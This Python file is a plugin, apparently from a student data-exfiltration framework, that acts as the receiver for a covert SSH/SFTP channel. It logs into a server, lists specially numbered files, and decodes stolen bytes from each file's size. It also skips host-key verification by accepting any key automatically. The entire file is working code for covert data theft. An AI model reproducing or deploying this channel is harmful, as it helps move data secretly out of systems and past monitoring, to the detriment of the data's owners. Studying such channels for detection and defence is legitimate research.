
from __future__ import annotations
from typing import Dict, Any, Iterable
import re, paramiko

from tfg.plugins.api import ExfilServerPlugin

BASE = 4096

class SshServerSize(ExfilServerPlugin):
    canal = "SSH"
    metodo = 3
    name = "ssh_server_size"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        host = config["host"]; port = int(config.get("port", 22))
        user = config["user"]; password = config.get("password")
        pkey_path = config.get("pkey_path")
        remote_dir = config.get("remote_dir") or "."
        exfil_id = config.get("exfil_id") or "tfg"
        pat = re.compile(rf"^{re.escape(exfil_id)}\.sz\.(\d{{6}})$")

        key = paramiko.RSAKey.from_private_key_file(pkey_path) if pkey_path else None
        ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password, pkey=key, look_for_keys=False)
        sftp = ssh.open_sftp()
        try:
            sftp.chdir(remote_dir); names = sftp.listdir_attr(".")
            parts = sorted(a for a in names if pat.match(a.filename))
            out = bytearray()
            for a in parts:
                b = (a.st_size - BASE) & 0xFF
                out.append(b)
            def gen():
                if out:
                    yield bytes(out)
                sftp.close(); ssh.close()
            return gen()
        except Exception:
            try: sftp.close(); ssh.close()
            except: pass
            raise
